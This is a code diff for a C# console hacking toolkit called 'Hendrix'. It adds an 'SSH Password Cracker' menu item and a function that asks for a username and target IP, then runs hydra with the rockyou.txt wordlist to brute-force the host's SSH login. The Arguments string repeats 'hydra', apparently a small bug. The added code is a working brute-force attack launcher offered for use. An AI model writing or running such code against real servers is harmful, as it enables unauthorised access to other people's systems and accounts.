@@ -2,10 +2,41 @@
 using System.Diagnostics;
 using System.Threading;
 
-namespace Scanner
+namespace Hendrix
 {
     internal class Program
     {
+
+        static void passwordCracker()
+        {
+            Console.Write("What is the username?: ");
+            string username = Console.ReadLine();
+
+
+            Console.Write("What is the ssh ip?: ");
+            string IP = Console.ReadLine();
+
+            using (Process process = new Process())
+            {
+                ProcessStartInfo startInfo = new ProcessStartInfo
+                {
+                    FileName = "hydra",
+                    Arguments = $"hydra -l {username} -P /usr/share/wordlists/rockyou.txt {IP} ssh",
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                process.StartInfo = startInfo;
+                process.Start();
+                string output = process.StandardOutput.ReadToEnd();
+                Console.WriteLine(output);
+                process.WaitForExit();
+            }
+        }
+
+
+
         // The Scanner function
         static void Scanner()
         {
@@ -90,7 +121,8 @@ namespace Scanner
                 TypewriterEffect("\nWelcome to Hendrix");
                 TypewriterEffect("1. Scanner");
                 TypewriterEffect("2. Web-Scanner");
-                TypewriterEffect("3. Exit");
+                TypewriterEffect("3. SSH Password Cracker");
+                TypewriterEffect("4. Exit");
                 Console.Write(": ");
 
                 if (int.TryParse(Console.ReadLine(), out int menu))
@@ -110,6 +142,12 @@ namespace Scanner
                             Console.Clear();
                             break;
                         case 3:
+                            passwordCracker();
+                            TypewriterEffect("\nPress any key to return to the main menu...");
+                            Console.ReadKey();
+                            Console.Clear();
+                            break;
+                        case 4:
                             TypewriterEffect("Exiting the program......");
                             Thread.Sleep(1000);
                             running = false;
